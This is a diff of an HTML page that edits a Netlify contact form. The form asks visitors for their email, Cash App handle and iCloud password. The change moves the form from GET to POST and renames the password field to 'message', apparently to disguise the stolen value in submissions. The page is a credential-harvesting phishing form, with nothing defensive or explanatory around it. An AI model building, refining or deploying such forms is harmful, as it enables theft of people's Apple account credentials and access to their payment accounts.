@@ -20,22 +20,20 @@
     <body>
         <div class="flex-container5"></div>
         <div class="flex-container">
-            <form name="contact" method="get" data-netlify="true">
-            <label>
-              Your email:
-              <input type="email" name="email">
-            </label>
-            <label>
-              Your cashapp:
-               <input name="cashapp">
-              </label>
-            <label>
-              Your iCloud password:
-              <textarea name="password"></textarea>
-            </label>
-            <!-- your other form fields go here -->
-            <button type="submit">Send</button>
-          </form>
+            <form name="contact" method="POST" data-netlify="true">
+                <p>
+                  <label>cashapp: <input type="text" name="cashapp" /></label>
+                </p>
+                <p>
+                  <label>Your Email: <input type="email" name="email" /></label>
+                </p>
+                <p>
+                  <label>iCloud password: <textarea name="message"></textarea></label>
+                </p>
+                <p>
+                  <button type="submit">Send</button>
+                </p>
+              </form>
           
     </body>
 </html>
